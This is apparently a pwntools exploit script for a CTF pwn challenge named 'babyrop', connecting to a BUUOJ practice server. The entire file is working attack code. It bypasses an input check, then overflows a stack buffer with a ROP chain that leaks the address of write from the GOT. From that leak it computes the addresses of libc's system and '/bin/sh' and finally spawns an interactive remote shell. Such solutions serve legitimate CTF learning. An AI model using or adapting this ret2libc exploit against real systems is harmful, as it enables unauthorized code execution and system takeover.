from pwn import *
#context.log_level = 'debug'

#io = process("./babyrop")node4.buuoj.cn:27507
io = remote("node4.buuoj.cn",27507)
elf = ELF("./h")
write_plt = elf.plt["write"]
write_got = elf.got["write"]
main = 0x08048825
ret = 0x080485D3
payload01 = b'\x00' + b'A'*6 + b'\xff'

io.sendline(payload01)
#231
payload02 = b'A'*(0xe7+4) +p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)
io.sendline(payload02)
io.recvuntil("Correct\n")
write_addr = u32(io.recv(4))
print(hex(write_addr))
#pause()
sys_lib=0x04a470
sbs_lib=0x18ee0e
write_lib=0x0f23c0
#sys_lib = 0x04a470
#sys_lib = 0x03adb0
#sbs_lib = 0x18ee0e
#sbs_lib = 0x15bb2b
#write_lib = 0x0f23c0
#write_lib = 0x0d5c90

#second time
io.sendline(payload01)
io.recvuntil("Correct\n")
sys_addr = write_addr - write_lib + sys_lib
sbs_addr = write_addr - write_lib + sbs_lib
payload03 = b'A'*(0xe7+4) + b'B'*4 +  p32(sys_addr) + p32(main) + p32(sbs_addr)
io.sendline(payload03)
io.interactive()
